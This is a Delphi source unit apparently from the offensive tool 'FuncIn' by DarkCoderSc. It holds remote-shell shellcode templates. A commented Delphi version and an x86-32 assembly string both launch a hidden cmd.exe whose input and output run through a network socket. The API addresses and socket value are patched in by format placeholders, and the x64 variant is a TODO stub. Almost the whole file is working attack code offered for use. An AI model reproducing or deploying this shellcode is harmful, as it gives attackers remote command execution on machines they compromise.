{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}

unit uFuncInTemplates;

interface

uses System.SysUtils,
     Winapi.Windows;

var __FUNCIN_x32__REMOTE_SHELL : String;
    __FUNCIN_x64__REMOTE_SHELL : String;

implementation

initialization

  (*****************************************************************************

    REMOTE SHELL

    There is no bad characters in FuncIn Shellcodes, NULL bytes are authorized.

  *****************************************************************************)

  (*

  // Delphi Equivalent Code

  function TraditionalThread(pParam : PVOID) : DWORD; stdcall;
  var AClient      : TSocket;
      AStartupInfo : TStartupInfo;
      AProcessInfo : TProcessInformation;

      ACOMSpec     : String;
  begin
    try
      AClient := PSocket(pParam)^;
      ///

      ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));
      AStartupInfo.cb := SizeOf(TStartupInfo);

      AStartupInfo.dwFlags     := STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW;
      AStartupInfo.hStdInput   := AClient;
      AStartupInfo.hStdOutput  := AClient;
      AStartupInfo.hStdError   := AClient;
      AStartupInfo.wShowWindow := SW_HIDE;

      ACOMSpec := GetEnvironmentVariable('ComSpec');

      UniqueString(ACOMSpec);

      CreateProcess(
        nil,
        PWideChar(ACOMSpec),
        nil,
        nil,
        True,
        CREATE_NEW_CONSOLE,
        nil,
        nil,
        AStartupInfo,
        AProcessInfo
      );

      ///
      WaitForSingleObject(AProcessInfo.hProcess, INFINITE);
    finally
      ExitThread(0);
    end;
  end;

  *)

  // x86-32 ////////////////////////////////////////////////////////////////////
  __FUNCIN_x32__REMOTE_SHELL :=
          { Prepare Stack }
          'mov ebp, esp;' +
          'sub esp, 0x4;' +                                                     // TProcessInformation Variable

          { Prepare stack room for TStartupInfoA structure }
          Format('mov edx, 0x%x;', [SizeOf(TStartupInfoA)]) +
          'sub esp, edx;' +

          { Zero-out memory region of our structure }
          'mov edi, esp;' +
          'mov ecx, edx;' +
          'xor eax, eax;' +
          'rep stosb;'    +

          { Assign our Socket Fd to `esi` }
          'mov esi, 0x%x;' +

          { Setup our structure (Only required properties) }
          'mov dword ptr [esp], edx;'        +                                  // Offset: 0x0 - TStartupInfoA.cb
                                                                                // Offset: 0x4 - TStartupInfoA.lpReserved
                                                                                // Offset: 0x8 - TStartupInfoA.lpDesktop
                                                                                // Offset: 0xc - TStartupInfoA.lpTitle
                                                                                // Offset: 0x10 - TStartupInfoA.dwX
                                                                                // Offset: 0x14 - TStartupInfoA.dwY
                                                                                // Offset: 0x18 - TStartupInfoA.dwXSize
                                                                                // Offset: 0x1c - TStartupInfoA.dwYSize
                                                                                // Offset: 0x20 - TStartupInfoA.dwXCountChars
                                                                                // Offset: 0x24 - TStartupInfoA.dwYCountChars
                                                                                // Offset: 0x28 - TStartupInfoA.dwFillAttribute
          Format('mov dword ptr [esp + 0x2c], 0x%x;', [
            STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
          ]) +                                                                  // Offset: 0x2c - TStartupInfoA.dwFlags

          Format('mov word ptr [esp + 0x30], 0x%x;', [SW_HIDE]) +               // Offset: 0x30 - TStartupInfoA.wShowWindow
                                                                                // Offset: 0x32 - TStartupInfoA.cbReserved2
                                                                                // Offset: 0x34 - TStartupInfoA.lpReserved2
          'mov dword ptr [esp + 0x38], esi;' +                                  // Offset: 0x38 - TStartupInfoA.hStdInput
          'mov dword ptr [esp + 0x3c], esi;' +                                  // Offset: 0x3c - TStartupInfoA.hStdOutput
          'mov dword ptr [esp + 0x40], esi;' +                                  // Offset: 0x40 - TStartupInfoA.hStdErrror

          'mov esi, esp;' +                                                     // Save TStartupInfoA structure to `esi`

          { Prepare stack room for TProcessInformation structure }
          Format('sub esp, 0x%x;', [SizeOf(TProcessInformation)]) +
          'mov [ebp-0x4], esp;' +                                               // Save TProcessInformation structure to stack variable

          { Push `cmd.exe` to stack, for NT AUTHORITY/SYSTEM, full path is required}
          'push 0x00657865;' +
          'push 0x2E646D63;' +
          'mov edx, esp;'    +                                                  // Save Application Name to `edx`

          { Call CreateProcessA }
          'xor eax, eax;' +

          'push [ebp-0x4];' +                                                   // lpProcessInformation
          'push esi;' +                                                         // lpStartupInfo
          'push eax;' +                                                         // lpCurrentDirectory
          'push eax;' +                                                         // lpEnvironment
          Format('push 0x%x;', [CREATE_NEW_CONSOLE]) +                          // dwCreationFlags
          'push 0x1;' +                                                         // bInheritHandles
          'push eax;' +                                                         // lpThreadAttributes
          'push eax;' +                                                         // lpProcessAttributes
          'push edx;' +                                                         // lpCommandLine
          'push eax;' +                                                         // lpApplicationName
          'mov eax, 0x%x;' +
          'call eax;' +                                                         // CreateProcessA

          { Call WaitForSingleObject }
          'xor eax, eax;'       +
          'dec eax;'            +                                               // 0xFFFFFFFF (INFINITE)
          'push eax;'           +                                               // dwMilliseconds
          'mov eax, [ebp-0x4];' +                                               // TProcessInformation->hProcess (Offset: 0x0)
          'push [eax];'         +
          'mov eax, 0x%x;'      +
          'call eax;'           +                                               // WaitForSingleObject

          { Call ExitProcess (Gracefully Exit) }
          'xor eax, eax;'  +
          'push eax;'      +                                                    // uExitCode
          'mov eax, 0x%x;' +
          'call eax;';                                                          // ExitProcess


  // x86-32 ////////////////////////////////////////////////////////////////////
  __FUNCIN_x64__REMOTE_SHELL := 'int3;int3;int3;int3'; // TODO


end.
